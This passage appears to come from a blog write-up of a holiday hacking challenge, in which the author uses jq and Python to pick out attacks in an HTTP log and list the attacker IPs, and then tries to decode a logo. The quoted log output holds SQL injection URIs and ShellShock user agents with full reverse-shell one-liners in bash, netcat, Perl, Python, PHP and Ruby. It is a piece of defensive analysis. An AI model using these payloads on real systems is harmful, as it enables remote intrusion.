"/api/stations?station_id=1' UNION SELECT 1,'automatedscanning','5e0bd03bec244039678f2b955a2595aa','',0,'',''/*&password=MoAOWs"
"/api/weather?station_id=1' UNION SELECT 2,'admin','$1$RxS1ROtX$IzA1S3fcCfyVfA9rwKBMi.','Administrator'/*&file=index&pass="
"/api/weather?station_id=1' UNION SELECT 1434719383,1857542197 --"
"/api/measurements?station_id=1' UNION SELECT 1434719383,1857542197 --"
"/api/stations?station_id=1' UNION SELECT 1,2,'automatedscanning',4,5,6,7,8,9,10,11,12,13/*"
"/api/weather?station_id=1' UNION/**/SELECT/**/2015889686,1,288214646/*"
"/api/weather?station_id=1' UNION/**/SELECT/**/850335112,1,1231437076/*"
```
This example is just for the URI. I saved the results of this query on the URI, User-Agent, Referrer, Username, Password, and Host to _sqli.log_, as with the others. 


For our last attack pattern, we have to tackle the rather wide attack category of "Shells." As previously noted, I will be splitting my analysis into two parts, with the first aimed at ShellShock, and the second at generic, networked shells. 

ShellShock, [as previously noted](https://www.troyhunt.com/everything-you-need-to-know-about2/), is an attack targeting CVE-2014-6271. The attack pattern is "() { :; };", where the characters can be separated by an arbitrary amount of whitespace. As such, the following query will identify any instances of it.
```
micrictor@laptop:/mnt/d/Projects/hh19/final$ jq '.[] | select( (.user_agent|test("([ ]{0,100})[ ]{0,100}{[ ]{0,100}:[ ]{0,100};[ ]{0,100}}[ ]{0,100};"; "x")) ) | .user_agent' http.log
"() { :; }; /bin/bash -i >& /dev/tcp/31.254.228.4/48051 0>&1"
"() { :; }; /bin/bash -c '/bin/nc 55535 220.132.33.81 -e /bin/bash'"
"() { :; }; /usr/bin/perl -e 'use Socket;$i=\"83.0.8.119\";$p=57432;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
"() { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"150.45.133.97\",54611));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
"() { :; }; /usr/bin/php -r '$sock=fsockopen(\"229.229.189.246\",62570);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
"() { :; }; /usr/bin/ruby -rsocket -e'f=TCPSocket.open(\"227.110.45.126\",43870).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
```

As before, these results get output to _shellshock.log_. 

Now  that we have our attacks, we need to figure out every IP that was used. For this, I created a list of user agents present in the attacker logs, then used a python script to find all logs with the same user agent. 
```
import json

attacker_ua_fl = open("attacker_uas.txt")
attacker_uas = [x.strip() for x in attacker_ua_fl.readlines()]

log_fl = open("http.log")

logs = json.load(log_fl)

for log in logs:
    if( log['user_agent'] in attacker_uas ):
        print(json.dumps(log))
```

Using this, we wind up with 90 unique attacker IPs.
```
micrictor@laptop:/mnt/d/Projects/hh19/final$ python ua_parse.py | jq -s '.[]."id.orig_h"' | sort | uniq | wc
    98     98    1604
```

Creating a list of comma-seperated values, in the format of IP/32, and submitting it to the API gets us a route ID of 0807198508261964, finishing the challenge.

Walking up into the newly opened bell-tower door, Santa says:
>You did it! Thank you! You uncovered the sinister plot to destroy the holiday season!
Through your diligent efforts, we’ve brought the Tooth Fairy to justice and saved the holidays!
Ho Ho Ho!
You did it! Thank you! You uncovered the sinister plot to destroy the holiday season!
Through your diligent efforts, we’ve brought the Tooth Fairy to justice and saved the holidays!
Ho Ho Ho!
The more I laugh, the more I fill with glee.
And the more the glee,
The more I'm a merrier me!
Merry Christmas and Happy Holidays.

While the Tooth Fairy, this year's crook, says:
>You foiled my dastardly plan! I’m ruined!
And I would have gotten away with it too, if it weren't for you meddling kids!

And our beloved sysadmin, Krampus, says:
>Congratulations on a job well done!
Oh, by the way, I won the Frido Sleigh contest.
I got 31.8% of the prizes, though I'll have to figure that out.


In the corner, there's also a note:
>Thankfully, I didn’t have to implement my plan by myself!
Jack Frost promised to use his wintry magic to help me subvert Santa’s horrible reign of holiday merriment NOW and FOREVER!

Oh dear. Maybe next year we will get to take down Mr. Frost. [It seems a lot of hate started with Dr. Who's trial.](https://www.holidayhackchallenge.com/2016/winners_answers.html)
## Logo Challenge

Listening to the [Security Weekly Holiday Hack Episode](https://securityweekly.com/shows/holiday-hack-challenge-psw-631/), Ed Skoudis brings attention to [two interesting things](https://youtu.be/eXGtr4N7-6k?t=1223) about the Elf University logo. First, there's latin at the bottom, "Ille te videt dum dormit". Second, the left half of the christmas tree is a [UPC barcode](https://www.gs1.org/standards/barcodes/ean-upc).

![ElfU-Logo]({{ site.baseurl }}/images/ElfUniversity.png)

### Lost in Translation
Latin, as you may know, is the foundational language upon which English, Spanish, French, Italian, and a handful of other languages are built. Rather than simply look up a translation, I'm going to try to figure it out using the two languages I understand, English and Spanish.

"Ille," when spoken, sounds very similar to the Spanish word "el", which is the masculine form of "the," or the completely different word, thanks to accents, "él," meaning "he" or "him."

"Te" is the indirect object pronoun for "you." For example, "I love you" in Spanish is "Te amo."

"Videt" seems to share a root word with the English "video." Applying the [Spanish rule for indirect object sentence structure](https://www.spanishdict.com/guide/indirect-object-pronoun-placement), we can deduce that it is a verb. Combining these two, the verb is likely to mean something like "to watch".

I have no idea what "dum" could mean. There's not any words I can think of in Spanish or English that look or sound like it. 

"Dormit" is likely related to the Spanish verb "dormir," meaning "to sleep." I cannot say with certainty that the Spanish grammar rules apply to Latin, but if they do, this verb would also act on the indirect object "te," making this mean something along the lines of "you sleep." 

All of this combined gives us something along the lines of "He watch you while you sleep," which is likely intended to translate to the fact that "he,", Mr. Claus, "sees you when you're sleeping."


### Tree UPC
Reading a UPC code is as simple as decoding two things: the width of lines and the meaning of the "code." For help with this, I read through [this guide](https://www.wikihow.com/Read-12-Digit-UPC-Barcodes#Reading-UPC-Barcodes-without-the-Numbers).

Unfortunately for me, I could not figure out how to read the barcode. Every way I tried, the digits I got were not valid in the UPC spec. From left to right, I got the following codes. The first is if I start with white, as the specification states, and the second if I start with "black."
```
2144 3223 2144 3223 2144 ...
1433 2232 1443 2232 1443 ...
```
From right to left, in the same order:
```
2322 3441 2322 3441 2322 ...
1232 2344 1232 2344 1232 ...
```

None of these numbers are valid in the UPC specification previously linked. I guess this one will just go unsolved.


## Summary
This year's holiday hack, as always, delivered. I appreciated the addition of an unlockable "fast travel" mechanism, reducing the amount of hopping around you have to do. I also appreciated the addition of both the offensive and defensive side of machine-learning technologies, as defending systems dependent on machine-learning, and therefore data, is a growing requirement. While there were some issues with certain challenges, most notably the crate, going down, given the scale of the holiday hack, and its low price of free, I certainly can't complain. Overall, it was yet another good year, where I learned how to use PowerShell to perform data analytics, how to use Graylog, and performed a bit of web application hacking. 

Until next year!